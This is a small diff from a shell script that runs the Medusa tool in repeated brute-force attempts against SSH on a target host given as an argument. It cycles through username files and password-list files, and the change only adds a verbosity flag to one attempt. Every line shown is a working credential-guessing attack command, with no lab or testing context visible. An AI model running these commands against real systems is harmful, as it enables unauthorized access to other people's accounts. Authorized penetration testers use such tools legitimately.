@@ -42,7 +42,7 @@ fi
 echo
 echo
 
-medusa -f -h $1 -U usuarios0.txt -P claves0.txt -M ssh -n 22
+medusa -f -h $1 -U usuarios0.txt -P claves0.txt -M ssh -n 22 -v4
 medusa -f -h $1 -U usuarios0.txt -P claves.txt -M ssh -n 22
 medusa -f -h $1 -U usuarios0.txt -P claves2.txt -M ssh -n 22
 medusa -f -h $1 -U usuarios.txt -P claves0.txt -M ssh -n 22
